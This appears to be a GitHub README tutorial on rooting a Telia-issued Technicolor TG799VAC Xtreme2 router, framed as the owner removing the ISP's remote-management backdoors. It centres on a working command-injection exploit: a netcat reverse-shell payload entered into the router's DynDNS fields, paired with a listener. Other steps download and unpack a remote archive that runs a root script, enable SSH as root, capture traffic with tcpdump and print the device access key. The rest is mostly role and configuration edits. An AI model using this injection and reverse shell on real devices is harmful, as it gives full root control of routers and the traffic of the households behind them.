# README

![Screenshot](files/tg799vacv2.gif)


   Alright guys, i have bricked my old TG799VAC-XTREME when i figured out how to generate the access key so I just got my new TG799 VAC Xtreme2 with version 17.2 Mint, 
   ofc i have hacked this one aswell since i DO not want backdoors in my network..

   I have not found any other tutorial how-to hack this version from technicolor in this way I have done it. Someone has to be the first on a new exploit and let everyone know what's really is an open door straight into your 
network and your digital life. This is 
   nothing people just should say things like "i do not care" cause this can really be abused if there is some blackhat hacker on the support or if someone just is curios about your life and has enough freetime . With TSHARK or 
WSHARK they can sniff ALL your 
traffic no matter what ppl say since the router is the last point in 'almost' all home-networks. I exposing Telia again cause i see this as a REAL threat to our privacy...I had never questioned this if the providers had been 
straight and honest about what they 
actually 
   have access to. I will expose every setting, every ip and every key i can found until they will remove the backdoors. Now im bored so let's start i really hate to write descs and the faster you get this information, the faster 
you can protect yourself from the 
backdoors. 

##### FIRST SOME RLY SCARRY SHIT THAT USERS HAS NO KNOWLEDGE ABOUT AT ALL!! 

###### The question is who has access to the logs from our router on the ip number you see in the picture below, why should they receive a lot of data from the router? They have gone so far so they storing logs when you start & 
restore the router, what are they doing with this data? This is really unpleasant and people really have no idea that things they do in their own home getting stored on a server in Stockholm / Telia. (whois the ip)

![Screenshot](files/wth.png)

##### Do you look forward to upgrade your firmware without any third party software or without any backdoors from your internet provider? Great, i will show you how you will do this easier then ever..

###### You have to add our admin user to upgradefw role and after this has been done you will get access. I have added a preview below the commands where to upload your new firmware (THIS IS DANGEROUS - DONT PLAY WITH THIS IF YOU 
HAVE NO KNOWLEDGE ABOUT HOW THIS WORKS IT WILL PROBABLY BRICK YOUR DEVICE WITH WRONG FIRMWARE, PERMANENT!):

    uci add_list web.uidefault.upgradefw_role='admin'
    uci commit
    
![Screenshot](files/upgrade_firmware.png)

##### Add your own user without any extra tools.

![Screenshot](files/adduser.gif)

##### wuseman got 100% control over Telia and Superuser roles and we are now able to add our user to become a Telia user:

![Screenshot](files/wuseman.pwned.telia.png)

# HOWTO GET ROOT ACCESS FROM WEBGUI:

##### Let us begin to hack for real now.. Set up a netcat listener on your machine, and adjust any firewall rules to allow an inbound connection:

    nc -lvvp [machine_port]

##### Go to the WAN Services and press SHOW ADVANCED. In username, password and domain field you need type the below command, after this is done just enable the dyndns. It wont matter wich hoster you choose just pick one, press 
save and just wait 4-5 seconds and you have just got full root access of your TG799VAC Xtreme 17.2 Mint, check preview video above if you do not understand.

    :::::::`nc [machine_IP] [machine_port] -e /bin/sh`

##### When you have successfully logged in, set a new root password, edit /etc/config/dropbear (THEY ARE USING 60022 AS DEFUALT PORT IN THIS VERSION NOT 22 AS BEFORE)

    passwd                                                                             
    sed -i "s/'option enable '0'/option enable '1'/g" /etc/config/dropbear    
    /etc/init.d/dropbear restart                                             
    exit                                                                   
    ssh -p 60022 root@192.168.1.1                                           


##### If WEBGUI is broken then you allways can reset your router with 'rtfd -all' command, use 'rtfd --soft' for keep settings.

![Screenshot](files/reset-router-with-rtfd-if-webgui-crashed.gif)

##### Banner (our internet providers have given us an firmware with absolutely minimal features, fuck you!!)

![Screenshot](files/webgui_default.png)

##### Banner(Default)

![Screenshot](files/banner_before_default.png)

##### I got many questions in my mail inbox how-to hack the Telia router with minimal settings to get fully unlock it with and root the device and get a brand new interface from Technicolor wich is default with _all_ default settings. So i decided to create a preview here at top to show you all how this is done, huge respect  to the italians that made this public and these who maintaince the GUI with new upgrades.

###### When you have root access to your router see how to get root access above on the Telia firmware.

###### Lets root it, then do following:

![Screenshot](files/reset_router.gif)

    curl -k https://repository.ilpuntotecnico.com/files/Ansuel/AGTEF/GUI.tar.bz2 --output /tmp/GUI.tar.bz2; bzcat /tmp/GUI.tar.bz2 | tar -C / -xvf -; /etc/init.d/rootdevice force

###### Its time to show your patience now, you should see a messeage: Root Script: Rooting in progress.. Wait few seconds, and now reboot router. Thats it, enjoy your fully unlocked router with alot of new settings! When you will  try to login after this process is done, it will look a like:

![Screenshot](files/login-screen-after-root.png)

##### Stats view:

![Screenshot](files/stats-view.gif)

##### Telstra Extension, really nice overview: 

![Screenshot](files/telstra-gui.png)

##### Printing some other examples below from Ansuels repo: 

![Screenshot](files/tim.png)
![Screenshot](files/dark-white.png)
![Screenshot](files/stats-login-after-root.png)
![Screenshot](files/gateway-info.png)
![Screenshot](files/gatewayinfo2.png)
![Screenshot](files/gatewayinfo3.png)
![Screenshot](files/gatewayinfo4.png)
![Screenshot](files/proof.png)
![Screenshot](files/upgrade.png)


##### Banner (AFTER)

![Screenshot](files/banner_when_done.png)

##### WEBUI (LUCI - REALLY ADVANCED - HIGH RISK - MIGHT BRICK YOUR DEVICE - I BRICKED MY OLD)

![Screenshot](files/wusemans_pwnS-100-percent-complete-hacking.png)

##### This is how it can be if you will stay with Telia gui (Recommended):

![Screenhot](files/telia_added_few_features.png)

##### Mount / as read and write

    mount -o remount,rw /

##### First of all we want to change telia > admin in all lp files.

    sed -i 's/telia/admin/' /www/docroot/modals/gateway-modal.lp
    sed -i 's/telia/admin/' /www/docroot/modals/internet-modal.lp 
    sed -i 's/telia/admin/' /www/docroot/modals/mmpbx-global-modal.lp 
    
![Screenshot](files/beforeandafter.png)

##### Get VPN access in webgui:

![Screenshot](files/vpn-in-webgui.png)

###### Add l2tpip to rules: 

    list rules 'l2tpipsecservermodal'

###### Now add below to /etc/config/web

    config rule 'l2tpipsecservermodal'
    option target '/modals/l2tp-ipsec-server-modal.lp'
    list roles 'admin'
    list roles 'engineer'

### IT IS VERY IMPORTANT TO ADD BELOW COMMANDS IN SAME ORDER I LISTED THEM. 
###### IF YOU ADD THEM IN WRONG ORDER YOU GET A ERROR MESSAGE: 'uci: Invalid Argument'

##### Rules

     add_list web.uidefault.upgradefw_role='admin'
     set web.natalghelpermodal=rule
     set web.relaymodal=rule
     set web.systemmodal=rule
     set web.iproutesmodal=rule
     set web.mmpbxinoutgoingmapmodal=rule
     set web.ltedoctor=rule
     set web.ltemodal=rule
     set web.lteprofiles=rule
     set web.ltesim=rule
     set web.ltesms=rule
     set web.logconnections=rule
     set web.logviewer=rule
     set web.logviewer.roles=rule
     set tod.global.enabled='1'
     set mobiled.globals.enabled='1'
     set mobiled.device_defaults.enabled='1'
     set web.uidefault.nsplink='https://sendit.nu'
     commit; /etc/init.d/nginx restart

##### Ruleset

     add_list web.ruleset_main.rules=xdsllowmodal
     add_list web.ruleset_main.rules=systemmodal
     add_list web.ruleset_main.rules=natalghelpermodal
     add_list web.ruleset_main.rules=diagnostics
     add_list web.ruleset_main.rules=basicviewaccesscodemodal
     add_list web.ruleset_main.rules=basicviewwifiguestmodal
     add_list web.ruleset_main.rules=basicviewwifiguest5GHzmodal
     add_list web.ruleset_main.rules=basicviewwifipskmodal
     add_list web.ruleset_main.rules=basicviewwifipsk5GHzmodal
     add_list web.ruleset_main.rules=basicviewwifissidmodal
     add_list web.ruleset_main.rules=basicviewwifissid5GHzmodal
     add_list web.ruleset_main.rules=relaymodal
     add_list web.ruleset_main.rules=iproutesmodal
     add_list web.ruleset_main.rules=mmpbxinoutgoingmapmodal
     add_list web.ruleset_main.rules=mmpbxstatisticsmodal
     commit; /etc/init.d/nginx restart

##### Target ( You will get even more stuff in webinterface after you run below commands )

     set web.mmpbxinoutgoingmapmodal.target='/modals/mmpbx-inoutgoingmap-modal.lp'
     set web.iproutesmodal.target='/modals/iproutes-modal.lp'
     set web.systemmodal.target='/modals/system-modal.lp'
     set web.relaymodal.target='/modals/relay-modal.lp'
     set web.natalghelpermodal.target='/modals/nat-alg-helper-modal.lp'
     set web.diagnosticstcpdumpmodal.target='/modals/diagnostics-tcpdump-modal.lp'
     set web.natalghelpermodal.target='/modals/basicview-accesscode-modal.lp'
     set web.natalghelpermodal.target='/modals/basicview-wifiguest-modal.lp'
     set web.natalghelpermodal.target='/modals/basicview-wifiguest5GHz-modal.lp'
     set web.natalghelpermodal.target='/modals/basicview-wifipsk-modal.lp'
     set web.natalghelpermodal.target='/modals/basicview-wifipsk5GHz-modal.lp'
     set web.natalghelpermodal.target='/modals/basicview-wifissid-modal.lp'
     set web.natalghelpermodal.target='/modals/basicview-wifissid5GHz-modal.lp'
     set web.ltemodal.target='/modals/lte-modal.lp'
     set web.ltedoctor.target='/modals/lte-doctor.lp'
     set web.lteprofiles.target='/modals/lte-profiles.lp'
     set web.logconnections.target='/modals/log-connections-modal.lp'
     set web.logviewer.target='/modals/logviewer-modal.lp'
     set web.ltesms.target='/modals/lte-sms.lp'
     set web.ltesim.target='/modals/lte-sim.lp'
     set web.xdsllowmodal.target='/modals/xdsl-low-modal.lp'
     commit; /etc/init.d/nginx restart

##### Roles ( You will see new stuff on webinterface after you run below commands)

     add_list web.assistancemodal.roles='admin' 
     add_list web.usermgrmodal.roles='admin'
     add_list web.cwmpconf.roles='admin'
     add_list web.todmodal.roles='admin'
     add_list web.iproutesmodal.roles='admin'
     add_list web.natalghelper.roles='admin'
     add_list web.mmpbxglobalmodal.roles='admin' 
     add_list web.mmpbxprofilemodal.roles='admin' 
     add_list web.parentalblock.roles=admin
     add_list web.mmpbxinoutgoingmapmodal.roles='admin'
     add_list web.systemmodal.roles='admin'
     add_list web.relaymodal.roles='admin'
     add_list web.natalghelpermodal.roles='admin'
     add_list web.diagnosticstcpdumpmodal.roles='admin'
     add_list web.ltedoctor.roles="admin"
     add_list web.ltemodal.roles="admin"
     add_list web.lteprofiles.roles="admin"
     add_list web.xdsllowmodal.roles='admin'
     add_list web.ltesim.roles="admin"
     add_list web.logconnections.roles="admin"
     add_list web.logviewer.roles="admin"
     add_list web.logconnections.roles="admin"
     add_list web.home.roles='admin'
     add_list web.ltesms.roles='admin'
     add_list web.logviewer.roles="admin"
     commit; /etc/init.d/nginx restart

##### Misc

    uci del_list mwan.acsreffileserv.policy='mgmt_only'
    uci del_list mwan.acsrefloadb.policy='mgmt_only'
    uci del_list mwan.acsprodloadb.policy='mgmt_only'
    uci add_list mwan.acsreffileserv.policy='mgmt'
    uci add_list mwan.acsrefloadb.policy='mgmt'
    uci add_list mwan.acsprodloadb.policy='mgmt'
    uci add_list mwan.acsreffileserv.policy='wan'
    uci add_list mwan.acsrefloadb.policy='wan'
    uci add_list mwan.acsprodloadb.policy='wan'
    uci add_list mwan.acsreffileserv.policy='lan'
    uci add_list mwan.acsrefloadb.policy='lan'
    uci add_list mwan.acsprodloadb.policy='lan'
    uci del_list mwan.acsreffileserv.dest_ip='10.54.3.204/32'
    uci del_list mwan.acsrefloadb.dest_ip='10.54.3.210/32'
    uci add_list mwan.acsprodloadb.dest_ip='xxx.xxx.xxx.0/24'
    uci add_list mwan.acsprodloadb.dest_ip='xxx.xxx.xxx.0/24'
    uci add_list mwan.acsprodloadb.dest_ip='192.168.1.0/24'
    uci add_list mwan.acsprodloadb.dest_ip='192.168.1.0/24'
    uci del_list mwan.acsreffileserv.dest_ip='10.54.3.204/32'
    uci add_list mwan.acsreffileserv.dest_ip='xxx.xxx.xxx.0/24'
    uci add_list mwan.acsreffileserv.dest_ip='192.168.1.0/24'
    uci commit; /etc/init.d/nginx restart

##### All kind of stuff for webgui (Nothing special, edit them after your needs)

    sed -i 's/The standard Username is 'Administrator'."/wuseman/g' /www/docroot/login.lp
    sed -i 's/Technicolor/This router has been hacked by wuseman/g' /www/docroot/*.lp
    sed -i 's/Technicolor/This router has been hacked by wuseman/g' /www/docroot/*.lp

##### EDIT YOUR CONFIG FILES MANUALLY, HERE IS SOME EXAMPLES

###### DHCP

    cat >> /etc/config/dhcp
    # WUSEMAN WAS HERE
    # EDITED: 2018-08-14

    config host
    option name 'hostname'
    option mac 'macaddr'
    option ip 'localip'

###### FIREWALL

    cat >> /etc/config/firewall 
    # WUSEMAN WAS HERE
    # EDITED: 2018-08-14

    config userredirect 'userredirectXXDD'
    option dest_port '<PORTNUMBER>'
    option dest 'lan'
    option src 'wan'
    list proto '<tcp>/<udp>/<tcpudp>'
    option enabled '<1>/<0>'
    option name 'CUSTOMNAMEINWEBINTERFACE'
    option src_dport '<PORTNUMBER>'
    option family '<ipv4>/<ipv6>'
    option target 'DNAT'
    option dest_ip '<lanip>'

##### Wanna have some fun? Edit all false to true and vice versa ;p 
###### DO THIS ON YOUR OWN RISK ( YOU HAVE BEEN WARNED )

    sed -i 's/false/true/g' /www/cards/*.lp
    sed -i 's/false/true/g' /www/lua/*.lua
    sed -i 's/false/true/g' /www/modals/*.lp
    sed -i 's/false/true/g' /www/snippets/*.lp
    sed -i 's/false/true/g' /www/docroot/*.lp
    sed -i 's/false/true/g' /www/docroot/
    sed -i 's/false/true/g' /www/docroot/ajax/*.lua

##### Add admin to everything and remove supuser and admin
###### DO THIS ON YOUR OWN RISK ( YOU HAVE BEEN WARNED )
    
    sed -i 's/false/true/g' /www/cards/010_lte.lp
    sed -i 's/telia/admin/' /www/docroot/modals/gateway-modal.lp
    sed -i 's/telia/admin/' /www/docroot/modals/internet-modal.lp 
    sed -i 's/telia/admin/' /www/docroot/modals/mmpbx-global-modal.lp 
    sed -i 's/superuser/admin/' /www/docroot/modals/gateway-modal.lp
    sed -i 's/superuser/admin/' /www/docroot/modals/internet-modal.lp 
    sed -i 's/superuser/admin/' /www/docroot/modals/mmpbx-global-modal.lp 
    uci commit

##### List all URLs for your firmware that can be downloaded:

    strings /etc/cwmpd.db 

    SQLite format 3
    tabletidkvtidkv
    CREATE TABLE tidkv (  type TEXT NOT NULL,  id TEXT NOT NULL,  key TEXT NOT NULL,  value TEXT,  PRIMARY KEY (type, id, key)))
    indexsqlite_autoindex_tidkv_1tidkv
    transferPassword5
    transfer Username
    Stransfer URLhttp://192.168.21.52:7547/ACS-server
    5transferaStartTime2018-08-19T15:20:13Z
    transfera FaultStringcomplete
    transfera FaultCode0M_
    M%5transfera CompleteTime2018-08-19T15:19:57Z
    'transfera TimeStamp244,9XXXXXX
    transfera DelaySeconds3
    transfera Password
    transfera Username
    runtimevarParameterKey#
    runtimevarConfigurationVersionD
    %_runtimevarBootStrappedhttps://acs.telia.com:7575/ACS-server/ACS-
    +/VersionsSoftwareVersion16.2.XXXXXX
    transfer FaultString
    transfer FaultCode
    transfer TimeSt6
    transfera UsernameU
    transfera URLT7
    transfera TimeStampX
    transfera SubStatec
    transfera Stateb7
    transfera StartTimed
    transfera PasswordV
    
##### OTHER TIPS & TRICKS  
    
##### Changing max sync speed on your modem:

    uci set xdsl.dsl0.maxaggrdatarate='200000' # 16000 default
    uci set xdsl.dsl0.maxdsdatarate='140000'   # 11000 default
    uci set xdsl.dsl0.maxusdatarate='60000'    # 40000 default
   
##### Enable/Disable dnsmasq:
 
    uci show dhcp.lan.ignore='1'

##### Enable/Disable network time server

    uci set system.ntp.enable_server='1'
     
##### Using bridge mode with a dedicated PPPoE ethernet port:
  
    uci set network.lan.dns='1.1.1.1'
    uci set network.lan.gateway='192.168.0.254'
    uci set mmpbxrvsipnet.sip_net.interface='lan'
    uci set mmpbxrvsipnet.sip_net.interface6='lan6'
    uci commit

##### You can check the current running dns with:

    cat /etc/resolv.conf
    
##### Edit nsplink to something else (where you get redirected when you click on the logo at top) 

    uci set web.uidefault.nsplink='https://sendit.nu'
    
##### This will show all traffic on your router with netstat:

    netstat -tulnp 

##### This will show all ip numbers connected to your router atm..

    netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sort -u  
     
##### Capture traffic on all interfaces (add -i wl0 for include wifi):

    tcpdump -vvv -ttt -p -U
    tcpdump -i wl0 -vvv -ttt -p -U
     
##### Enable or Disable WWAN support (mobiled)

     uci set mobiled.globals.enabled='0'
     uci set mobiled.device_defaults.enabled='0'
     
##### Enable or Disable Content Sharing (Samba / DNLA)

     uci set samba.samba.enabled='1'
     uci set dlnad.config.enabled='1'

##### To view currently dhcp leases:

     cat /tmp/dhcp.leases
     1534969000 macaddr lanip machine macaddr
     
##### Add new modals:

    uci set web.modalsmodalrule=rule
    uci set web.ruleset_main.rules=modalsmodalsrule
    uci add_list web.l2tpipsecservermodal.target='/modals/modals-name.lp'
    uci set web.l2tpipsecservermodal.roles='roles'
    uci commit; /etc/init.d/nginx restart

##### Enable or disable nginx remote: 

     uci set web.remote.active='1'

##### To view arp log
 
     cat /tmp/arp.log
     root@OpenWrt:/tmp# cat /tmp/arp.log 
     IP address       HW type     Flags       HW address            Mask     Device
     lanip            0x1         0x2         X0:X0:X0:X0:X0:X0      *        br-lan
     mgmt_ip          0x1         0x2         X0:X0:X0:X0:X0:X0     *        vlan_mgmt
     wanip            0x1         0x2         X0:X0:X0:X0:X0:X0     *        eth4
     
##### List mac-addresses.

    ifconfig -a  | sed '/eth\|wl/!d;s/ Link.*HWaddr//
    eth0      X0:X0:X0:X0:X0:X0  
    eth1      X0:X0:X0:X0:X0:X0 
    eth2      X0:X0:X0:X0:X0:X0  
    eth3      X0:X0:X0:X0:X0:X0 
    eth4      X0:X0:X0:X0:X0:X0 
    eth5      X0:X0:X0:X0:X0:X0 
    vlan_eth0 X0:X0:X0:X0:X0:X0 
    vlan_eth1 X0:X0:X0:X0:X0:X0  
    vlan_eth2 X0:X0:X0:X0:X0:X0   
    vlan_eth3 X0:X0:X0:X0:X0:X0  
    vlan_eth5 X0:X0:X0:X0:X0:X0 
    wl0       X0:X0:X0:X0:X0:X0 
    wl0_1     X0:X0:X0:X0:X0:X0   
    wl0_2     X0:X0:X0:X0:X0:X0  
   
##### Remove Monitor Of Traffic:

     uci delete system.@trafficmon[0].interface=''
     uci delete system.@trafficmon[0].minute=''
     uci delete system.@trafficmon[1].interface=''
     uci delete system.@trafficmon[1].minute=''
     uci delete system.@trafficmon[2].interface=''
     uci delete system.@trafficmon[2].minute=''
     uci delete system.@trafficmon[3]=trafficmon
     uci delete system.@trafficmon[3].interface=''
     uci delete system.@trafficmon[3].minute=''
     uci delete web.trafficmonitor=rule
     uci delete web.ruleset_main.rules='gateway'
     uci delete web.trafficmonitor.target='/modals/traffic-monitor.lp'
     uci delete web.trafficmonitor.roles='admin'

##### Disable Time of Day ACL rules

     uci set tod.global.enabled='0'
      
##### For login with debug mode enabled, then please go to (Proably not possible but it is to try):
     
     http://192.168.1.1/?debug=1
     
##### Disable so your router wont restart if there is an segmentation fault in a user space program.

    uci set system.@coredump[0].reboot='0'
    uci commit system

##### Just type below command for print the accesskey. (More info will get added here soon how this is generated)

    sed -e 's/^\(.\{8\}\).*/\1/' /proc/rip/0124

##### You can check the current running dns with

    cat /etc/resolv.conf
    
##### Edit nsplink to something else (where you get redirected when you click on the logo at top) 

    uci set web.uidefault.nsplink='https://sendit.nu'

 
##### Enable or Disable WWAN support (mobiled)

     uci set mobiled.globals.enabled='1'
     uci set mobiled.device_defaults.enabled='1'
    
##### Enable or Disable Content Sharing (Samba / DNLA)

     uci set samba.samba.enabled='1'
     uci set dlnad.config.enabled='1'
     
##### To view currently dhcp leases:

     cat /tmp/dhcp.leases
     1534969000 macaddr lanip machine macaddr
     
##### To view arp log
 
     cat /tmp/arp.log
     root@OpenWrt:/tmp# cat /tmp/arp.log 
     IP address       HW type     Flags       HW address            Mask     Device
     lanip            0x1         0x2         X0:X0:X0:X0:X0:X0      *        br-lan
     mgmt_ip          0x1         0x2         X0:X0:X0:X0:X0:X0     *        vlan_mgmt
     wanip            0x1         0x2         X0:X0:X0:X0:X0:X0     *        eth4
     
##### List mac-addr.

    ifconfig -a  | sed '/eth\|wl/!d;s/ Link.*HWaddr//
    eth0      X0:X0:X0:X0:X0:X0  
    eth1      X0:X0:X0:X0:X0:X0 
    eth2      X0:X0:X0:X0:X0:X0  
    eth3      X0:X0:X0:X0:X0:X0 
    eth4      X0:X0:X0:X0:X0:X0 
    eth5      X0:X0:X0:X0:X0:X0 
    vlan_eth0 X0:X0:X0:X0:X0:X0 
    vlan_eth1 X0:X0:X0:X0:X0:X0  
    vlan_eth2 X0:X0:X0:X0:X0:X0   
    vlan_eth3 X0:X0:X0:X0:X0:X0  
    vlan_eth5 X0:X0:X0:X0:X0:X0 
    wl0       X0:X0:X0:X0:X0:X0 
    wl0_1     X0:X0:X0:X0:X0:X0   
    wl0_2     X0:X0:X0:X0:X0:X0  
   
##### Disable Monitor Of Traffic

     uci set system.@trafficmon[0].interface=''
     uci set system.@trafficmon[0].minute=''
     uci set system.@trafficmon[1].interface=''
     uci set system.@trafficmon[1].minute=''
     uci set system.@trafficmon[2].interface=''
     uci set system.@trafficmon[2].minute=''
     uci set system.@trafficmon[3]=trafficmon
     uci set system.@trafficmon[3].interface=''
     uci set system.@trafficmon[3].minute=''

##### Remove telia from all roles: 

    uci delete web_back.uidefault.upgradefw_role='telia'
    uci delete web_back.usr_assist.role='telia'
    uci delete web_back.gateway.roles='telia' 
    uci delete web_back.login.roles='telia' 
    uci delete web_back.password.roles='telia' 
    uci delete web_back.homepage.roles='telia' 
    uci delete web_back.gatewaymodal.roles='telia' 
    uci delete web_back.broadbandmodal.roles='telia' 
    uci delete web_back.internetmodal.roles='telia' 
    uci delete web_back.wirelessmodal.roles='telia' 
    uci delete web_back.wirelessclientmodal.roles='telia' 
    uci delete web_back.wirelessqrcodemodal.roles='telia' 
    uci delete web_back.ethernetmodal.roles='telia' 
    uci delete web_back.devicemodal.roles='telia' 
    uci delete web_back.wanservices.roles='telia' 
    uci delete web_back.firewallmodal.roles='telia' 
    uci delete web_back.diagnosticsconnectionmodal.roles='telia' 
    uci delete web_back.diagnosticsnetworkmodal.roles='telia' 
    uci delete web_back.diagnosticspingmodal.roles='telia' 
    uci delete web_back.diagnosticsxdslmodal.roles='telia' 
    uci delete web_back.diagnosticsigmpproxymodal.roles='telia' 
    uci delete web_back.assistancemodal.roles='telia' 
    uci delete web_back.usermgrmodal.roles='telia' 
    uci delete web_back.syslogmodal.roles='telia' 
    uci delete web_back.dmzmodal.roles='telia' 
    uci delete web_back.iproutesmodal.roles='telia'
    uci delete web_back.contentsharing.roles='telia' 
    uci delete web_back.parentalmodal.roles='telia'
    uci delete web_back.iptv.roles='telia'
    uci delete web_back.home.roles='telia'
    uci delete web_back.accesscode.roles='telia'
    uci delete web_back.wifissid.roles='telia'
    uci delete web_back.wifipsk.roles='telia'
    uci delete web_back.wifiguest.roles='telia'
    uci delete web_back.wifissid5GHz.roles='telia'
    uci delete web_back.wifipsk5GHz.roles='telia'
    uci delete web_back.wifiguest5GHz.roles='telia'
    uci delete web_back.mmpbxglobalmodal.roles='telia' 
    uci delete web_back.mmpbxprofilemodal.roles='telia' 
    uci delete web_back.mmpbxinoutgoingmodal.roles='telia' 
    uci delete web_back.mmpbxservicemodal.roles='telia' 
    uci delete web_back.mmpbxdectmodal.roles='telia' 

##### And now add our admin or engineer role to these rules instead, set will override current config so you its not needed to run above if you want to add admin to these settings instead.

    uci set web_back.uidefault.upgradefw_role='admin'
    uci set web_back.usr_assist.role='admin'
    uci set web_back.gateway.roles='admin' 
    uci set web_back.login.roles='admin' 
    uci set web_back.password.roles='admin' 
    uci set web_back.homepage.roles='admin' 
    uci set web_back.gatewaymodal.roles='admin' 
    uci set web_back.broadbandmodal.roles='admin' 
    uci set web_back.internetmodal.roles='admin' 
    uci set web_back.wirelessmodal.roles='admin' 
    uci set web_back.wirelessclientmodal.roles='admin' 
    uci set web_back.wirelessqrcodemodal.roles='admin' 
    uci set web_back.ethernetmodal.roles='admin' 
    uci set web_back.devicemodal.roles='admin' 
    uci set web_back.wanservices.roles='admin' 
    uci set web_back.firewallmodal.roles='admin' 
    uci set web_back.diagnosticsconnectionmodal.roles='admin' 
    uci set web_back.diagnosticsnetworkmodal.roles='admin' 
    uci set web_back.diagnosticspingmodal.roles='admin' 
    uci set web_back.diagnosticsxdslmodal.roles='admin' 
    uci set web_back.diagnosticsigmpproxymodal.roles='admin' 
    uci set web_back.assistancemodal.roles='admin' 
    uci set web_back.usermgrmodal.roles='admin' 
    uci set web_back.syslogmodal.roles='admin' 
    uci set web_back.dmzmodal.roles='admin' 
    uci set web_back.contentsharing.roles='admin' 
    uci set web_back.parentalmodal.roles='admin'
    uci set web_back.iptv.roles='admin'
    uci set web_back.home.roles='admin'
    uci set web_back.accesscode.roles='admin'
    uci set web_back.wifissid.roles='admin'
    uci set web_back.wifipsk.roles='admin'
    uci set web_back.wifiguest.roles='admin'
    uci set web_back.wifissid5GHz.roles='admin'
    uci set web_back.wifipsk5GHz.roles='admin'
    uci set web_back.wifiguest5GHz.roles='admin'
    uci set web_back.mmpbxglobalmodal.roles='admin' 
    uci set web_back.mmpbxprofilemodal.roles='admin' 
    uci set web_back.mmpbxinoutgoingmodal.roles='admin' 
    uci set web_back.mmpbxservicemodal.roles='admin' 
    uci set web_back.mmpbxdectmodal.roles='admin' 

##### Add another role if you want, then use add_list instead of set:

    uci add_list web_back.uidefault.upgradefw_role='engineer'
    uci add_list web_back.usr_assist.role='engineer'
    uci add_list web_back.gateway.roles='engineer' 
    uci add_list web_back.login.roles='engineer' 
    uci add_list web_back.password.roles='engineer' 
    uci add_list web_back.homepage.roles='engineer' 
    uci add_list web_back.gatewaymodal.roles='engineer' 
    uci add_list web_back.broadbandmodal.roles='engineer' 
    uci add_list web_back.internetmodal.roles='engineer' 
    uci add_list web_back.wirelessmodal.roles='engineer' 
    uci add_list web_back.wirelessclientmodal.roles='engineer' 
    uci add_list web_back.wirelessqrcodemodal.roles='engineer' 
    uci add_list web_back.ethernetmodal.roles='engineer' 
    uci add_list web_back.devicemodal.roles='engineer' 
    uci add_list web_back.wanservices.roles='engineer' 
    uci add_list web_back.firewallmodal.roles='engineer' 
    uci add_list web_back.diagnosticsconnectionmodal.roles='engineer' 
    uci add_list web_back.diagnosticsnetworkmodal.roles='engineer' 
    uci add_list web_back.diagnosticspingmodal.roles='engineer' 
    uci add_list web_back.diagnosticsxdslmodal.roles='engineer' 
    uci add_list web_back.diagnosticsigmpproxymodal.roles='engineer' 
    uci add_list web_back.assistancemodal.roles='engineer' 
    uci add_list web_back.usermgrmodal.roles='engineer' 
    uci add_list web_back.syslogmodal.roles='engineer' 
    uci add_list web_back.dmzmodal.roles='engineer' 
    uci add_list web_back.iproutesmodal.roles=
    uci add_list web_back.contentsharing.roles='engineer' 
    uci add_list web_back.parentalmodal.roles='engineer'
    uci add_list web_back.iptv.roles='engineer'
    uci add_list web_back.home.roles='engineer'
    uci add_list web_back.accesscode.roles='engineer'
    uci add_list web_back.wifissid.roles='engineer'
    uci add_list web_back.wifipsk.roles='engineer'
    uci add_list web_back.wifiguest.roles='engineer'
    uci add_list web_back.wifissid5GHz.roles='engineer'
    uci add_list web_back.wifipsk5GHz.roles='engineer'
    uci add_list web_back.wifiguest5GHz.roles='engineer'
    uci add_list web_back.mmpbxglobalmodal.roles='engineer' 
    uci add_list web_back.mmpbxprofilemodal.roles='engineer' 
    uci add_list web_back.mmpbxinoutgoingmodal.roles='engineer' 
    uci add_list web_back.mmpbxservicemodal.roles='engineer' 
    uci add_list web_back.mmpbxdectmodal.roles='engineer' 

##### Disable Time of Day ACL rules

     uci set tod.global.enabled='0'
     
##### List installed packages:

    echo $(opkg list_installed | awk '{ print $1 }') 
   
##### List installed packages in a tree:

    echo $(opkg list_installed | awk '{ print $1 }') | xargs -n 1
     
##### For login with debug mode enabled, then please go to:
     
     http://192.168.1.1/?debug=1
      
#### Login to ssh without any password:

##### Generate the Key Pair on your pc (not router):

     ssh-keygen -t dsa

##### Next copy the public key with SCP to OpenWrt:
   
    scp ~/.ssh/id_dsa.pub root@192.168.1.1:/tmp

##### Add the public key to the authorized_keys from ~/.ssh/id_dsa.pub

     cd /etc/dropbear
     cat /tmp/id_*.pub >> authorized_keys
     chmod 0600 authorized_keys
     exit
  
##### Disconnect from your router and type following on your pc:
   
     ssh root@192.168.1.1 "tee -a /etc/dropbear/authorized_keys" < ~/.ssh/id_rsa.pub
     
##### Connect to your router without any password.
   
     ssh root@192.168.1.1
 
### Have fun and be careful with other settings not provided by me! ;)

#### THIS WIKI IS LICENSED UNDER MIT
#### AUTHOR/OWNER OF THIS WIKI IS wuseman

# CONTACT

     If you have problems, questions, ideas or suggestions please contact
     us by posting to info@sendit.nu

# WEB SITE

     Visit our homepage for the latest info and updated tools

     https://sendit.nu & https://github.com/wuseman/

### END!







